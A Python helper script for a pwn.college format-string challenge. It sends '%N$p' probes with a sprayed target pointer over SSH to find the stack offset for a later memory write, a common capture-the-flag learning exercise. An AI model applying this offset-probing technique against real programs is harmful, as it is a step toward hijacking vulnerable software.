import subprocess
import struct

ADDR = 0x4040E0
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

base = "AAA |"
pointer = struct.pack("<Q", ADDR)
spray_buf = bytearray(8 * 8 + 8)
for shift in range(8):
    spray_buf[shift : shift + 8] = pointer
spray = bytes(spray_buf)

import sys

START = int(sys.argv[1]) if len(sys.argv) > 1 else 1
END = int(sys.argv[2]) if len(sys.argv) > 2 else START + 10

for idx in range(START, END):
    fmt = (base + f"%{idx}$p").encode()
    payload = fmt + spray
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    if "0x4040e00000000000" in out:
        print("idx", idx)
        print(out)
        break
else:
    print(f"not found in range {START}-{END-1}")
